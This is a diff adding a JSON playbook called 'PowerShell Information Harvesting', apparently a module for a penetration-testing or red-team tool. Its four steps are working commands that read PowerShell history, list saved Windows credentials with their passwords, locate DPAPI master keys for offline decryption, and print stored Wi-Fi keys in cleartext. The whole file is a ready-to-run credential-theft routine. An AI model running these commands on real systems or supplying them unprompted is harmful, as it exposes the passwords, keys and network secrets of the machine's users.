@@ -1,0 +1,31 @@
+{
+	"name": "PowerShell Information Harvesting",
+	"description": "Extract credentials, history, and system data using PowerShell.",
+	"tools": [],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Command History",
+			"command": "Get-Content (Get-PSReadLineOption).HistorySavePath",
+			"description": "Retrieve PowerShell console history."
+		},
+		{
+			"index": 2,
+			"name": "Saved Credentials",
+			"command": "cmdkey /list; Get-StoredCredential | Select Name,UserName,Password",
+			"description": "List Windows and PowerShell saved creds."
+		},
+		{
+			"index": 3,
+			"name": "DPAPI Master Keys",
+			"command": "dir \"$env:APPDATA\\Microsoft\\Protect\\\" -Recurse | ? {!$_.PSIsContainer}",
+			"description": "Locate user DPAPI keys for offline decryption."
+		},
+		{
+			"index": 4,
+			"name": "Wi-Fi Profiles",
+			"command": "netsh wlan show profiles | Select-String \"All User Profile\" | %{$_.ToString().Split(':')[1].Trim()} | %{netsh wlan show profile name=$_ key=clear}",
+			"description": "Extract SSID and cleartext keys."
+		}
+	]
+}
